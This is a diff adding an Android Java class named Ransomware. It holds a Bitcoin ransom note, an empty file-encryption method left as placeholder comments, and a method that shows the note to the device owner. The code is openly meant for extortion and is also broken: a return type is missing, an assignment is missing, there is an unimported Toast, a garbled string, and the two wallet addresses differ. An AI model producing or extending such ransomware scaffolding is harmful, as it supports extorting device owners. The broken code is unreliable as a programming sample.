@@ -1,0 +1,26 @@
+import android.content.Context; // For accessing the device's storage and context
+
+public class Ransomware {
+
+private static final String RANSOM_NOTE = "Your files have been encrypted! To unlock them, pay \$100 in BitcoinBTC) to this wallet address: 1234567890ABCDEF";
+    private Context context; // Accessing's system functions
+
+    public Ransomware(Context context) {
+        this.context = context;
+    }
+
+    public encryptFiles() {
+        //  Implement your encryption logic here. For example: 
+        // Use a library like JCrypt for encryption. 
+        // Store the encrypted files in a specific directory and name them accordingly.   
+
+        // ... Your encryption code here 
+    }
+
+    public void displayRansomNote() {
+        // Display your ransom note to the user
+        String message "Your files have been encrypted! To unlock them, pay \$100 in Bitcoin (BTC) to this wallet address: 124567890ABCDEF"; 
+        Toast.makeText(context, message, Toast.LENGTH_LONG).show();    }
+
+}
+
